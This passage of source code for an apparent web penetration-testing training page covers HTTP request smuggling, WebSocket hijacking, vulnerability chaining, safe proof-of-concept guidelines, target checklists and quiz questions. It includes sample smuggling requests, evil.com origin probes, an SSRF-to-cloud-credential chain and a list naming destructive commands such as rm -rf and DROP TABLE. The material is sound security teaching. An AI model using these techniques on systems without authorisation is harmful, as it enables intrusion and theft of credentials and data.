      "Create PoC with opacity: 0 iframe",
    ],
    cwe: ["CWE-1021: Improper Restriction of Rendered UI Layers"],
  },
];

// Section 6: HTTP Smuggling
const smugglingTopics: TopicSection[] = [
  {
    title: "Classic HTTP Request Smuggling",
    icon: <HttpIcon />,
    color: "#ef4444",
    description: "CL.TE and TE.CL desynchronization attacks between front-end and back-end servers.",
    detailedDescription: `HTTP Request Smuggling exploits disagreements between servers about where one HTTP request ends and the next begins. When a front-end server (load balancer, CDN, reverse proxy) and back-end server interpret request boundaries differently, attackers can smuggle requests that bypass security controls.

**Why It Happens**: HTTP allows two methods to specify message body length:
- **Content-Length (CL)**: Body is exactly this many bytes
- **Transfer-Encoding: chunked (TE)**: Body is chunked, ends with 0\\r\\n\\r\\n

When both headers are present, servers may disagree about which to use.

**Attack Types**:

**CL.TE** (Front-end uses Content-Length, Back-end uses Transfer-Encoding):
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
Front-end sends 13 bytes (including "0\\r\\n\\r\\n" and "SMUGGLED"), but back-end sees the chunk terminator and leaves "SMUGGLED" as the start of the next request.

**TE.CL** (Front-end uses Transfer-Encoding, Back-end uses Content-Length):
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
Front-end reads chunks until "0\\r\\n", but back-end only reads 3 bytes ("8\\r\\n"), leaving the rest as next request.

**Impact**:
- Bypass security controls (WAF, authentication)
- Poison web cache
- Hijack other users' requests
- Capture credentials from other users
- Access internal endpoints

**Detection**: Send ambiguous requests and observe timing differences or error messages that indicate desynchronization. Use Burp's HTTP Request Smuggler extension for automated detection.`,
    realWorldExample: "Researchers found HTTP smuggling in a major SaaS provider. By smuggling a malicious request, they could make the application treat subsequent requests from other users as coming from the attacker. This allowed capturing authentication headers and session tokens from other users visiting the same server.",
    beginnerTips: [
      "Install Burp's 'HTTP Request Smuggler' extension - it automates detection of CL.TE and TE.CL",
      "Test sites behind CDNs/load balancers - single-server setups can't have smuggling",
      "Start with timing-based detection: smuggled requests cause delays if they're waiting for more data",
      "Learn the chunked encoding format: chunk-size\\r\\n chunk-data\\r\\n ... 0\\r\\n\\r\\n",
      "Focus on sites with caching or those serving multiple users through shared infrastructure"
    ],
    commonMistakes: [
      "Testing smuggling on sites that don't have a front-end/back-end architecture",
      "Not understanding chunked encoding format - practice crafting valid chunked requests first",
      "Missing TE.TE vulnerabilities where Transfer-Encoding header can be obfuscated"
    ],
    keyPoints: [
      "Content-Length vs Transfer-Encoding disagreement",
      "CL.TE: Front-end uses CL, back-end uses TE",
      "TE.CL: Front-end uses TE, back-end uses CL",
      "TE.TE: Obfuscating Transfer-Encoding header",
      "Request poisoning and response queue poisoning",
    ],
    techniques: [
      "CL.TE: Send request where CL is shorter than body + chunked",
      "TE.CL: Send chunked request with CL covering only first chunk",
      "Obfuscation: Transfer-Encoding: chunked, Transfer-Encoding: x",
      "Use timing to detect vulnerabilities",
    ],
    tools: ["Burp Suite HTTP Request Smuggler", "smuggler.py"],
    cwe: ["CWE-444: HTTP Request/Response Smuggling"],
  },
  {
    title: "HTTP/2 Request Smuggling",
    icon: <SpeedIcon />,
    color: "#8b5cf6",
    description: "Exploiting HTTP/2 to HTTP/1.1 downgrade for smuggling attacks.",
    detailedDescription: `HTTP/2 Request Smuggling exploits the protocol downgrade that occurs when front-end servers accept HTTP/2 but back-end servers only support HTTP/1.1. HTTP/2's binary framing and different handling of headers creates new smuggling opportunities.

**HTTP/2 Fundamentals**:
- Binary protocol (not text-based like HTTP/1.1)
- Headers are compressed (HPACK)
- Multiplexed streams over single connection
- No Content-Length needed - frames have explicit lengths

**Downgrade Smuggling (H2.CL, H2.TE)**:
When HTTP/2 is converted to HTTP/1.1:
- Front-end server accepts HTTP/2 request
- Converts to HTTP/1.1 for back-end
- Discrepancies in conversion create smuggling opportunities

**H2.CL**: Inject Content-Length header that conflicts with frame length
**H2.TE**: Inject Transfer-Encoding header (normally disallowed in HTTP/2 but allowed in some implementations)

**HTTP/2-Specific Attacks**:
- **Header injection via HTTP/2**: Inject \\r\\n in header values to add arbitrary headers after downgrade
- **Pseudo-header abuse**: Manipulate :method, :path, :authority headers
- **Request tunneling via CONNECT**: Use HTTP/2 CONNECT to tunnel arbitrary requests

**Why HTTP/2 Makes Things Worse**:
1. HTTP/2 doesn't have Content-Length restrictions the same way
2. Header names allow more characters than HTTP/1.1
3. Front-end may normalize HTTP/2 requests in unexpected ways
4. Connection reuse is more aggressive, improving attack reliability

**Testing**:
- Use Burp Suite's HTTP/2 support
- Check if site supports HTTP/2 (browser DevTools  Network  Protocol column)
- Try injecting unusual headers and see how they're converted to HTTP/1.1
- Test with different Content-Length values in HTTP/2 requests`,
    realWorldExample: "HTTP/2 downgrade smuggling was discovered affecting major CDNs including Netlify and Amazon CloudFront. Attackers could inject headers containing CRLF sequences that, after downgrade to HTTP/1.1, created malicious requests. This bypassed WAF rules and allowed cache poisoning across thousands of websites using these CDNs.",
    beginnerTips: [
      "Check if the target uses HTTP/2: look at Protocol column in DevTools Network tab",
      "Use Burp Suite's built-in HTTP/2 support for testing",
      "Try injecting Content-Length headers in HTTP/2 requests (shouldn't normally be there)",
      "Look for CDNs/reverse proxies that downgrade HTTP/2 to HTTP/1.1 for backends",
      "Header injection via CRLF is more viable in HTTP/2 due to different header encoding"
    ],
    commonMistakes: [
      "Not checking if HTTP/2 is actually in use (many sites still HTTP/1.1 only)",
      "Using HTTP/1.1 testing techniques without understanding HTTP/2 differences",
      "Forgetting that HTTP/2 is a binary protocol - raw CRLF in strings won't work the same way"
    ],
    keyPoints: [
      "H2.CL and H2.TE smuggling",
      "HTTP/2 header injection via CRLF",
      "Pseudo-header manipulation",
      "HTTP/2 exclusive headers exploitation",
      "Request tunneling via CONNECT",
    ],
    techniques: [
      "Inject headers via HTTP/2 binary framing",
      "Exploit Content-Length handling differences",
      "Use HTTP/2 CONNECT for request tunneling",
      "Test with HTTP/2-specific tools",
    ],
  },
  {
    title: "WebSocket Smuggling",
    icon: <WifiIcon />,
    color: "#10b981",
    description: "Exploiting WebSocket upgrade handling for cross-site attacks.",
    detailedDescription: `WebSocket Smuggling exploits how reverse proxies and load balancers handle the WebSocket Upgrade handshake. This can lead to request smuggling, authentication bypass, and cross-site attacks.

**WebSocket Basics**: WebSocket connections start as HTTP, then "upgrade" to a persistent two-way connection:
1. Client sends HTTP request with Upgrade: websocket
2. Server responds with 101 Switching Protocols
3. Connection is now a WebSocket - no more HTTP rules

**Cross-Site WebSocket Hijacking (CSWSH)**: Similar to CSRF but for WebSockets. If WebSocket endpoints don't validate the Origin header, an attacker's page can establish a WebSocket connection to the victim site using the victim's session cookies.

**WebSocket Upgrade Smuggling**: Some reverse proxies mishandle the Upgrade request:
- Proxy sees Upgrade header and stops inspecting
- Attacker includes smuggled HTTP request in the body
- After upgrade, smuggled request reaches backend as HTTP
- Can bypass WAF, access internal services, or poison cache

**Attack Scenarios**:
- **CSWSH**: Open WebSocket from evil.com to target.com/ws, read messages meant for victim
- **Request smuggling**: Use upgrade request to smuggle HTTP requests past proxy
- **Access internal services**: WebSocket upgrade may be allowed to internal services that HTTP isn't
- **Protocol confusion**: Some servers allow HTTP after failed WS upgrade, enabling attacks

**Testing WebSocket Security**:
1. Check if Origin header is validated (send Origin: https://evil.com)
2. Look for CSRF tokens in WebSocket establishment
3. Test message injection - can you inject other users' subscriptions?
4. Check authentication - does WS use session cookie or separate auth?`,
    realWorldExample: "A chat application allowed any origin to establish WebSocket connections. Attackers created a malicious webpage that connected to the chat WebSocket using the victim's session cookie. They could read all private messages in real-time and send messages as the victim, leading to sensitive data exposure and account impersonation.",
    beginnerTips: [
      "Look for WebSocket connections in DevTools (Network tab, filter by WS)",
      "Check if the WebSocket accepts any Origin header - try Origin: https://evil.com",
      "Use a WebSocket client (browser console or wscat) to interact directly",
      "Test CSWSH by creating HTML page that opens victim site's WebSocket",
      "Check if messages are authenticated - can you see other users' data?"
    ],
    commonMistakes: [
      "Forgetting to test WebSocket endpoints for the same vulns as REST APIs",
      "Not checking Origin validation on WebSocket upgrade requests",
      "Missing CSWSH because it requires victim to visit attacker's page (like CSRF)"
    ],
    keyPoints: [
      "WebSocket hijacking via smuggling",
      "Cross-Site WebSocket Hijacking (CSWSH)",
      "WebSocket to HTTP downgrade",
      "Origin validation bypass",
    ],
    techniques: [
      "Smuggle requests via WebSocket upgrade",
      "Test Origin header validation",
      "Check for CSRF in WebSocket handshake",
      "Exploit reverse proxy WebSocket handling",
    ],
  },
  {
    title: "Browser Desync Attacks",
    icon: <LinkOffIcon />,
    color: "#f59e0b",
    description: "Client-side desynchronization for connection hijacking.",
    detailedDescription: `Browser Desync Attacks are a client-side variant of HTTP request smuggling. Instead of exploiting front-end/back-end server disagreements, they exploit the browser's connection pool to attack other users visiting the same website.

**How Browsers Reuse Connections**: Browsers maintain pools of HTTP connections to improve performance. Multiple requests to the same origin share connections. If you can desync a connection, the next request on that connection (potentially from another browser tab or script) receives data meant for your smuggled request.

**CL.0 Desync**: The server ignores Content-Length entirely and expects the body to determine message length via some other mechanism. This creates a desync:
1. Send request with Content-Length header and body containing a smuggled request
2. Server ignores CL, processes only initial request
3. Browser thinks connection is clean (body sent as CL indicated)
4. Smuggled request affects next request on the connection

**Pause-Based Desync**: Exploit timing by sending partial requests:
1. Send request with large Content-Length
2. Send partial body, then pause
3. Server timeout may process the partial request
4. Connection desynchronized for subsequent requests

**Impact**:
- **Response queue poisoning**: Steal responses meant for other requests
- **Credential theft**: If subsequent request includes authentication, steal it
- **Cache poisoning**: Poison the browser's cache with malicious responses
- **Same-site attack amplification**: Attack other users on same website

**Key Difference from Server-Side Smuggling**: Classic smuggling attacks other users through shared server infrastructure. Browser desync attacks other tabs/scripts through the browser's shared connection pool.`,
    realWorldExample: "Researchers demonstrated browser desync attacks against Amazon, Akamai, and other major websites. By desynchronizing the browser's connection pool, they could inject arbitrary responses into other users' browser tabs visiting the same site, enabling JavaScript injection and credential theft across different browsing contexts.",
    beginnerTips: [
      "This is an advanced topic - understand classic HTTP smuggling first",
      "Test by sending requests with mismatched Content-Length and actual body size",
      "Look for servers that don't strictly validate Content-Length",
      "Use browser's DevTools Network tab to observe connection reuse (same Connection ID)",
      "Focus on sites with keep-alive connections and high traffic"
    ],
    commonMistakes: [
      "Confusing browser desync with server-side smuggling - the attack path is different",
      "Not understanding HTTP connection pooling and keep-alive mechanisms",
      "Testing in isolation - browser desync needs connection reuse to be impactful"
    ],
    keyPoints: [
      "Client-side desync via CL.0",
      "Pause-based desync",
      "Browser connection pool poisoning",
      "Stealing other users' responses",
    ],
    techniques: [
      "CL.0: Server ignores Content-Length completely",
      "Poison browser's connection pool",
      "Exploit keep-alive connection reuse",
      "Target same-site credential theft",
    ],
  },
];

// Section 7: Testing Workflow
const workflowTopics: TopicSection[] = [
  {
    title: "Building Test Cases from Findings",
    icon: <AssignmentIcon />,
    color: "#3b82f6",
    description: "Structuring your testing approach based on initial reconnaissance.",
    detailedDescription: `A systematic approach to building test cases ensures thorough coverage and helps you find vulnerabilities others miss. Good test cases are specific, documented, and traceable to security requirements.

**Test Case Structure**: Each test case should include:
- Target: Specific endpoint, parameter, or functionality
- Test objective: What vulnerability are you testing for?
- Preconditions: Authentication state, user role, required setup
- Test steps: Exact actions to perform
- Expected result: What a secure application should do
- Actual result: What actually happened
- Evidence: Screenshots, requests/responses, video

**Building from Reconnaissance**: Convert recon data into test cases:
- Each endpoint = multiple test cases (auth check, input validation, business logic)
- Each parameter = injection tests, boundary tests, type confusion
- Each functionality = abuse cases, privilege escalation, race conditions
- Each technology = framework-specific vulnerabilities

**Prioritization Framework**:
1. **Critical first**: Authentication, payment, admin functions
2. **High-value targets**: User data, file operations, external integrations
3. **Common vulnerability areas**: Input fields, APIs, file uploads
4. **Business logic**: Workflows, multi-step processes, limits
5. **Edge cases**: Error handling, unusual inputs, timeout conditions

**Documentation Best Practices**:
- Use consistent naming: [Module]-[Function]-[Test Type]-[Number]
- Link test cases to OWASP Testing Guide sections
- Track status: Not started, In progress, Passed, Failed, Blocked
- Document version tested - re-run after patches
- Include reproduction steps detailed enough for developers`,
    realWorldExample: "A pentester created 200+ test cases from recon of an e-commerce site. By systematically working through each endpoint with authentication bypass, injection, and business logic tests, they found 23 vulnerabilities including an IDOR that exposed 50,000 customer records - something ad-hoc testing had missed in three previous engagements.",
    beginnerTips: [
      "Start with a spreadsheet: URL, parameters, test type, status, notes",
      "Use the OWASP Testing Guide as a checklist for each test category",
      "Test each endpoint with multiple roles: unauthenticated, user, admin",
      "Document EVERYTHING - you'll need it for the report and retesting",
      "Track your coverage - don't leave endpoints untested because you got distracted by a finding"
    ],
    commonMistakes: [
      "Diving into random testing without a systematic approach",
      "Not documenting test cases - can't prove coverage or reproduce later",
      "Getting distracted by one finding and abandoning other test areas"
    ],
    keyPoints: [
      "Create test cases for each endpoint",
      "Map test cases to OWASP Testing Guide",
      "Prioritize based on functionality risk",
      "Document authentication requirements per test",
      "Track coverage and completion",
      "Use checklists for consistency",
    ],
    tips: [
      "Start with authentication and authorization tests",
      "Test input validation on all parameters",
      "Document expected vs actual behavior",
      "Retest after developers claim fixes",
    ],
  },
  {
    title: "Chaining Vulnerabilities",
    icon: <LinkIcon />,
    color: "#8b5cf6",
    description: "Combining multiple findings to demonstrate maximum business impact.",
    detailedDescription: `Vulnerability chaining combines multiple lower-severity findings into a high-impact attack path. A skilled pentester doesn't just find individual bugs - they show how attackers would combine them for maximum damage.

**Why Chaining Matters**:
- Demonstrates real-world attack scenarios
- Elevates severity (multiple lows can = critical)
- Shows business impact more clearly
- Helps prioritize fixes (breaking one link breaks the chain)
- Proves exploitation isn't theoretical

**Common Chains**:

**Self-XSS + CSRF = Reflected XSS Impact**:
Self-XSS alone requires victim to inject themselves. CSRF forces victims to submit requests. Combined: CSRF triggers the self-XSS, making it exploitable.

**IDOR + Sensitive Data = Account Takeover**:
IDOR to access other users' data might seem low if it's just profile info. But if that profile contains password reset tokens or API keys, it's account takeover.

**SSRF + Cloud Metadata = Credential Theft**:
Basic SSRF to internal IPs might seem limited. But hitting cloud metadata endpoint steals IAM credentials = full infrastructure compromise.

**Open Redirect + OAuth = Account Takeover**:
Open redirect alone is usually low severity. But if it's in OAuth redirect_uri, attacker steals auth codes.

**Information Disclosure + Authentication = Bypass**:
Leaking username enumeration + password policy info + rate limit issues = viable brute force attack.

**Building Chain Documentation**:
1. Diagram the attack flow visually
2. Show each vulnerability's role in the chain
3. Demonstrate in PoC - video walkthrough
4. Calculate combined CVSS/severity
5. Explain which link to break for remediation`,
    realWorldExample: "A bug bounty hunter found three 'low severity' issues: SSRF (internal only), info disclosure (AWS region), and error messages leaking paths. Individually, worth maybe $300 total. Chained together: SSRF to internal metadata URL (learned from region) to get IAM credentials, then used those to access S3 buckets with customer data. The chain was worth $25,000.",
    beginnerTips: [
      "Keep a list of all findings, even low-severity ones - they might chain later",
      "Ask: 'What can I do with this?' for every finding - don't stop at the first impact",
      "Learn common chains: XSS+CSRF, SSRF+cloud, IDOR+info disclosure",
      "Draw attack diagrams - visualizing helps identify chain opportunities",
      "When stuck, look for 'stepping stones' - intermediate vulns that enable others"
    ],
    commonMistakes: [
      "Reporting findings individually without considering how they combine",
      "Missing chains because you didn't explore 'low' findings thoroughly",
      "Not documenting chains clearly - reviewers need to understand the full path"
    ],
    keyPoints: [
      "Self-XSS + CSRF = Reflected XSS impact",
      "IDOR + sensitive data = full account takeover",
      "SSRF + cloud metadata = credential theft",
      "Low-severity chain to critical impact",
      "Document attack paths clearly",
    ],
    techniques: [
      "Map relationships between vulnerabilities",
      "Consider multi-step attack scenarios",
      "Think like an attacker: what's the end goal?",
      "Demo chains in controlled PoC environments",
    ],
  },
  {
    title: "Safe Proof of Concept Guidelines",
    icon: <WarningIcon />,
    color: "#f59e0b",
    description: "Demonstrating impact without causing harm to production systems.",
    detailedDescription: `A good Proof of Concept (PoC) proves a vulnerability exists and demonstrates its impact WITHOUT causing harm. This is both an ethical requirement and a practical skill - damaging client systems ends engagements (and careers).

**The Golden Rule**: Prove the vulnerability exists with MINIMUM necessary impact. You don't need to steal all user data to prove SQLi - extracting version() is enough.

**Safe Payloads by Vulnerability Type**:

**Remote Code Execution (RCE)**:
- SAFE: whoami, hostname, id, uname -a, dir, ipconfig
- NEVER: rm -rf, shutdown, format, del, wget malware

**SQL Injection**:
- SAFE: SELECT version(), SELECT current_user(), SELECT 1,2,3
- NEVER: DROP TABLE, DELETE FROM, UPDATE, INSERT (modifying data)

**XSS**:
- SAFE: alert(document.domain), console.log('XSS'), alert(1)
- NEVER: document.cookie theft, keylogging, phishing payloads
- BETTER: Use XSS Hunter for proof without accessing real cookies

**SSRF**:
- SAFE: Hit your own server (Burp Collaborator, webhook.site)
- CAREFUL: Internal metadata endpoints (retrieve info, don't modify)
- NEVER: Attack internal services, delete/modify data

**File Access**:
- SAFE: /etc/passwd (public info), /windows/win.ini
- NEVER: Access real user files, PII, credentials files

**Documentation Standards**:
1. Clear title describing the vulnerability
2. Affected endpoint/parameter
3. Step-by-step reproduction
4. Request/response with sensitive data redacted
5. Screenshots or video
6. Impact explanation in business terms
7. Remediation recommendation

**Special Situations**:
- If you accidentally access sensitive data: STOP, document, report immediately, don't explore further
- Always coordinate with client about scope and acceptable testing
- When in doubt, ask - it's better to check than to cause harm`,
    realWorldExample: "A pentester found SQL injection in a banking application. Instead of extracting account data, they demonstrated with SELECT version() and SELECT current_user(). For impact, they showed they COULD access account tables by retrieving table names (SELECT table_name FROM information_schema.tables) - proving the risk without viewing actual customer data. This safe approach maintained client trust.",
    beginnerTips: [
      "For RCE: stick to whoami/hostname - proves execution without risk",
      "For SQLi: SELECT version() proves it; you don't need to dump the database",
      "For XSS: alert(document.domain) is the gold standard - simple and safe",
      "Use Burp Collaborator/webhook.site to prove connections without accessing real systems",
      "When you find sensitive data, document ONE example (redacted) and stop"
    ],
    commonMistakes: [
      "Over-exploiting to 'prove impact' when minimal evidence is sufficient",
      "Accessing more data than needed - one record proves IDOR, not 10,000",
      "Not coordinating with client about acceptable testing boundaries"
    ],
    keyPoints: [
      "Use benign payloads (alert, console.log)",
      "Avoid data destruction or modification",
      "Don't access more data than needed to prove the issue",
      "Use your own test accounts where possible",
      "Document with screenshots and video",
      "Never exfiltrate real user data",
    ],
    tips: [
      "For RCE: whoami, hostname (not rm -rf)",
      "For SQLi: SELECT version(), not DROP TABLE",
      "For XSS: alert(document.domain), not cookie theft",
      "Always coordinate with client before exploitation",
    ],
  },
  {
    title: "Documenting and Prioritizing Issues",
    icon: <DescriptionIcon />,
    color: "#10b981",
    description: "Writing clear, actionable reports with proper severity ratings.",
    keyPoints: [
      "Use CVSS for consistent severity scoring",
      "Include clear reproduction steps",
      "Provide remediation recommendations",
      "Include business impact assessment",
      "Attach supporting evidence",
      "Executive summary for non-technical stakeholders",
    ],
    techniques: [
      "Title: Clear, specific vulnerability name",
      "Severity: Critical/High/Medium/Low/Info",
      "Description: What, where, why it matters",
      "Steps: Numbered, reproducible instructions",
      "Impact: What an attacker could achieve",
      "Remediation: How to fix it",
    ],
  },
];

// Section Navigation Items
const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <SecurityIcon /> },
  { id: "methodology", label: "Overview & Methodology", icon: <SearchIcon /> },
  { id: "auth", label: "Auth & Access Control", icon: <LockIcon /> },
  { id: "injection", label: "Injection Attacks", icon: <BugReportIcon /> },
  { id: "server-side", label: "Server-Side Attacks", icon: <StorageIcon /> },
  { id: "client-side", label: "Client-Side Attacks", icon: <WebIcon /> },
  { id: "smuggling", label: "HTTP Smuggling", icon: <SyncAltIcon /> },
  { id: "api-testing", label: "API Security Testing", icon: <HttpIcon /> },
  { id: "workflow", label: "Testing Workflow", icon: <AssignmentIcon /> },
  { id: "tools", label: "Tools & Payloads", icon: <BuildIcon /> },
  { id: "resources", label: "Resources", icon: <DescriptionIcon /> },
  { id: "quiz", label: "Knowledge Check", icon: <SchoolIcon /> },
];

const modernTargets = [
  {
    title: "Single Page Apps (SPA)",
    icon: <WebIcon />,
    color: "#f59e0b",
    description: "Client-side routing, heavy API usage, and token storage choices introduce unique risks.",
    checks: [
      "DOM-based XSS sinks and unsafe templating",
      "JWT storage in localStorage or sessionStorage",
      "CORS configuration for API endpoints",
      "Client-side role checks without server enforcement",
    ],
  },
  {
    title: "GraphQL APIs",
    icon: <DataObjectIcon />,
    color: "#8b5cf6",
    description: "GraphQL can expose deep data graphs and requires strict field-level authorization.",
    checks: [
      "Introspection exposure in production",
      "AuthZ for nested fields and resolvers",
      "Query depth and complexity limits",
      "Batching and rate limit bypass",
    ],
  },
  {
    title: "WebSockets and Real-Time",
    icon: <SyncAltIcon />,
    color: "#10b981",
    description: "Persistent connections can bypass traditional HTTP controls and logging.",
    checks: [
      "Auth enforcement on upgrade and reconnect",
      "Message validation and schema checks",
      "Origin and CSRF-style protections",
      "Rate limiting for message floods",
    ],
  },
  {
    title: "Serverless and Cloud Services",
    icon: <CloudIcon />,
    color: "#ef4444",
    description: "Cloud-native apps often integrate storage, queues, and metadata endpoints.",
    checks: [
      "SSRF to cloud metadata services",
      "Public object storage and bucket policies",
      "Overly broad IAM roles and permissions",
      "Secrets exposure in logs and environment variables",
    ],
  },
  {
    title: "Third-Party and Supply Chain",
    icon: <LinkIcon />,
    color: "#3b82f6",
    description: "External scripts, analytics, and SDKs expand the attack surface.",
    checks: [
      "Subresource Integrity (SRI) for CDN assets",
      "CSP coverage for third-party domains",
      "Dependency versions and known CVEs",
      "Exposed API keys in client bundles",
    ],
  },
  {
    title: "CI/CD and Staging Environments",
    icon: <SettingsIcon />,
    color: "#6366f1",
    description: "Build pipelines and non-prod systems often expose debug endpoints and data.",
    checks: [
      "Staging endpoints without auth",
      "Debug flags and verbose error messages",
      "Public artifacts and build logs",
      "Test credentials reused in production",
    ],
  },
];

const ACCENT_COLOR = "#ef4444";
const QUIZ_QUESTION_COUNT = 10;

const selectRandomQuestions = (questions: QuizQuestion[], count: number) =>
  [...questions].sort(() => Math.random() - 0.5).slice(0, count);

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Recon",
    question: "The primary goal of reconnaissance is to:",
    options: [
      "Map the attack surface and identify entry points",
      "Exploit vulnerabilities immediately",
      "Disable security controls",
      "Generate the final report",
    ],
    correctAnswer: 0,
    explanation: "Recon identifies assets, endpoints, and technologies to guide testing.",
  },
  {
    id: 2,
    topic: "Recon",
    question: "Which file often reveals disallowed paths and admin areas?",
    options: ["robots.txt", "sitemap.xml", "favicon.ico", "humans.txt"],
    correctAnswer: 0,
    explanation: "robots.txt commonly lists paths the site wants crawlers to avoid.",
  },
  {
    id: 3,
    topic: "Tools",
    question: "Which tool is most commonly used as an intercepting proxy?",
    options: ["Burp Suite", "Wireshark", "Nmap", "Metasploit"],
    correctAnswer: 0,
    explanation: "Burp Suite is the standard web proxy for pentesting.",
  },
  {
    id: 4,
    topic: "CORS",
    question: "Which response header controls allowed origins for CORS?",
    options: ["Access-Control-Allow-Origin", "Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"],
    correctAnswer: 0,
    explanation: "Access-Control-Allow-Origin specifies which origins can access resources.",
  },
  {
    id: 5,
    topic: "Authorization",
    question: "IDOR is best described as:",
    options: [
      "Accessing objects by manipulating identifiers",
      "Bypassing multi-factor authentication",
      "Injecting SQL statements",
      "Breaking TLS encryption",
    ],
    correctAnswer: 0,
    explanation: "IDOR occurs when object references are not properly authorized.",
  },
  {
    id: 6,
    topic: "CSRF",
    question: "CSRF attacks rely on:",
    options: [
      "A victim's authenticated session",
      "A malformed TLS handshake",
      "Server-side code execution",
      "Bypassing input validation",
    ],
    correctAnswer: 0,
    explanation: "CSRF uses a victim's existing session to perform actions.",
  },
  {
    id: 7,
    topic: "CSRF",
    question: "A common CSRF mitigation is:",
    options: ["Per-request anti-CSRF tokens", "Client-side validation only", "Removing all cookies", "Disabling HTTPS"],
    correctAnswer: 0,
    explanation: "CSRF tokens bind requests to the user session.",
  },
  {
    id: 8,
    topic: "JWT",
    question: "Setting JWT alg to none can lead to:",
    options: ["Signature bypass", "Token encryption", "Token expiration", "CORS errors"],
    correctAnswer: 0,
    explanation: "Using alg=none can allow unsigned tokens.",
  },
  {
    id: 9,
    topic: "Sessions",
    question: "Session fixation occurs when:",
    options: [
      "An attacker sets or predicts a session ID",
      "A user logs out",
      "Sessions expire too quickly",
      "Cookies are encrypted",
    ],
    correctAnswer: 0,
    explanation: "Fixation lets attackers force a known session ID.",
  },
  {
    id: 10,
    topic: "Sessions",
    question: "Which cookie attribute prevents JavaScript access?",
    options: ["HttpOnly", "Secure", "SameSite", "Path"],
    correctAnswer: 0,
    explanation: "HttpOnly blocks client-side scripts from reading cookies.",
  },
  {
    id: 11,
    topic: "Sessions",
    question: "The Secure cookie attribute ensures cookies are sent:",
    options: ["Only over HTTPS", "Only with GET requests", "Only with POST requests", "Only to localhost"],
    correctAnswer: 0,
    explanation: "Secure restricts cookies to encrypted transport.",
  },
  {
    id: 12,
    topic: "Sessions",
    question: "SameSite cookies help reduce:",
    options: ["CSRF", "SQL injection", "XSS", "SSRF"],
    correctAnswer: 0,
    explanation: "SameSite limits cross-site cookie sending.",
  },
  {
    id: 13,
    topic: "SQL Injection",
    question: "Union-based SQLi is commonly used to:",
    options: ["Extract data from other tables", "Encrypt traffic", "Patch databases", "Generate tokens"],
    correctAnswer: 0,
    explanation: "UNION lets attackers combine query results to extract data.",
  },
  {
    id: 14,
    topic: "SQL Injection",
    question: "Time-based blind SQLi relies on:",
    options: ["Response delays to infer data", "Verbose error messages", "Direct database access", "Static analysis"],
    correctAnswer: 0,
    explanation: "Delays indicate true/false conditions in blind SQLi.",
  },
  {
    id: 15,
    topic: "NoSQL",
    question: "A common NoSQL injection pattern is:",
    options: ['{"$ne": null}', "UNION SELECT", "<script>", "../etc/passwd"],
    correctAnswer: 0,
    explanation: "Mongo-style operators like $ne can bypass filters.",
  },
  {
    id: 16,
    topic: "XSS",
    question: "DOM-based XSS occurs primarily in:",
    options: ["Client-side JavaScript", "Database queries", "Web servers", "TLS termination"],
    correctAnswer: 0,
    explanation: "DOM XSS happens in the browser due to unsafe JS.",
  },
  {
    id: 17,
    topic: "XSS",
    question: "Stored XSS means the payload is:",
    options: ["Persisted on the server and served to users", "Reflected immediately only", "Executed only in the tester browser", "Blocked by default"],
    correctAnswer: 0,
    explanation: "Stored XSS persists and affects multiple users.",
  },
  {
    id: 18,
    topic: "XSS",
    question: "A Content Security Policy (CSP) primarily:",
    options: ["Restricts allowed script sources", "Encrypts cookies", "Blocks SQLi", "Enables HTTP/2"],
    correctAnswer: 0,
    explanation: "CSP limits which sources can execute scripts.",
  },
  {
    id: 19,
    topic: "XXE",
    question: "XXE can be used to:",
    options: ["Read local files", "Reset passwords", "Bypass TLS", "Disable logging"],
    correctAnswer: 0,
    explanation: "XXE often exposes local files or internal resources.",
  },
  {
    id: 20,
    topic: "SSRF",
    question: "SSRF commonly targets:",
    options: ["Internal services and metadata endpoints", "User browsers", "Database backups", "DNS servers only"],
    correctAnswer: 0,
    explanation: "SSRF makes servers call internal services or metadata APIs.",
  },
  {
    id: 21,
    topic: "File Inclusion",
    question: "LFI stands for:",
    options: ["Local File Inclusion", "Live Function Injection", "Local Form Injection", "Log File Import"],
    correctAnswer: 0,
    explanation: "LFI allows attackers to read local files via path manipulation.",
  },
  {
    id: 22,
    topic: "File Inclusion",
    question: "A common path traversal payload uses:",
    options: ["../", "<script>", "--", "${}"],
    correctAnswer: 0,
    explanation: "../ sequences traverse directories.",
  },
  {
    id: 23,
    topic: "File Upload",
    question: "Safe file upload handling includes:",
    options: ["Validating extension, MIME type, and magic bytes", "Trusting the filename", "Allowing executable files", "Storing in web root"],
    correctAnswer: 0,
    explanation: "Multiple checks help prevent file upload abuse.",
  },
  {
    id: 24,
    topic: "Command Injection",
    question: "Command injection often uses which separators?",
    options: ["; and &&", "? and &", "+ and -", "% and #"],
    correctAnswer: 0,
    explanation: "Separators chain commands in shell contexts.",
  },
  {
    id: 25,
    topic: "SSTI",
    question: "A common SSTI test payload is:",
    options: ["{{7*7}}", "SELECT *", "<img>", "../../"],
    correctAnswer: 0,
    explanation: "Template expressions like {{7*7}} reveal SSTI.",
  },
  {
    id: 26,
    topic: "Deserialization",
    question: "Insecure deserialization can lead to:",
    options: ["Remote code execution", "Improved performance", "Stronger encryption", "Shorter sessions"],
    correctAnswer: 0,
    explanation: "Gadget chains can execute code when deserialized.",
  },
  {
    id: 27,
    topic: "Brute Force",
    question: "A key mitigation for brute force is:",
    options: ["Rate limiting and account lockout", "Allowing unlimited attempts", "Storing passwords in plaintext", "Disabling logs"],
    correctAnswer: 0,
    explanation: "Rate limits and lockouts slow credential attacks.",
  },
  {
    id: 28,
    topic: "Credentials",
    question: "Credential stuffing is:",
    options: ["Using leaked passwords across sites", "Guessing random passwords", "Phishing only", "Brute forcing OTPs"],
    correctAnswer: 0,
    explanation: "Stuffing reuses known leaked credentials.",
  },
  {
    id: 29,
    topic: "Passwords",
    question: "Best practice for password storage is:",
    options: ["Salted hashing with bcrypt or Argon2", "Plaintext storage", "MD5 without salt", "Encrypting with a hardcoded key"],
    correctAnswer: 0,
    explanation: "Modern hashing with salts resists cracking.",
  },
  {
    id: 30,
    topic: "MFA",
    question: "A common MFA bypass is:",
    options: ["Accessing endpoints that skip MFA", "Using HTTPS", "Disabling cookies", "Changing user agents"],
    correctAnswer: 0,
    explanation: "Some flows allow access without completing MFA.",
  },
  {
    id: 31,
    topic: "OAuth",
    question: "The OAuth state parameter protects against:",
